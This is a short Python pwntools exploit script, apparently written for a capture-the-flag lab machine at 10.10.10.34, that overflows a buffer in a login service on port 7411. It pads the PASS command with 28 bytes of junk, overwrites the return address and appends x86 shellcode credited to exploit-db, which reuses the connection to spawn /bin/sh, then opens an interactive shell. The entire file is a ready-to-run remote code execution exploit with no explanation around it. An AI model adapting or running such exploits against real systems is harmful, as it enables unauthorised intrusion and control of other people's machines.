#!/usr/bin/python3
# coding: utf-8

from pwn import *

def def_handler(sig, frame):
	print("\n\n[!]Saindo...\n\n")
	sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variable_Global
main_url = "10.10.10.34"
port = 7411
offset = 28
debug = 0xffffd610

# re-use /bin/sh exploitdb
buf = b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
buf += b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
buf += b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
buf += b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
buf += b"\x89\xe3\x31\xc9\xcd\x80"

def exploit():

	junk = b'A' * offset
	eip = p32(debug + 32)
	esp = buf

	payload = junk + eip + esp

	p = remote(main_url, port)

	p.recvuntil(b"OK Ready. Send USER command.")
	p.sendline(b"USER admin")
	p.recvuntil(b"OK Send PASS command.")
	p.sendline(b"PASS " + payload)

	p.interactive()

if __name__ == '__main__':
	exploit()
